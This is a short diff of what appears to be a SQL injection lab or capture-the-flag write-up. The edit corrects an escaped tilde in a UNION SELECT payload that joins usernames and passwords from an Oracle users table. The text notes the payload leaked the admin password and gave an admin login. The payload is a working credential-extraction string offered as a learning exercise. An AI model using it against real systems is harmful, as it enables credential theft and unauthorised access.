@@ -40,5 +40,5 @@ Used NULL,username||'\~'||password FROM users-- when the query only had
 one usable column for output.
 `||` is Oracle's string concat operator, joins username and password together.
 `\~` separator splits the two values apart in the output for easy reading.
-Payload: ' UNION SELECT NULL,username||'\~'||password FROM users--
+Payload: ' UNION SELECT NULL,username||'~'||password FROM users--
 Leaked output as administrator\~<password>, logged in as admin.
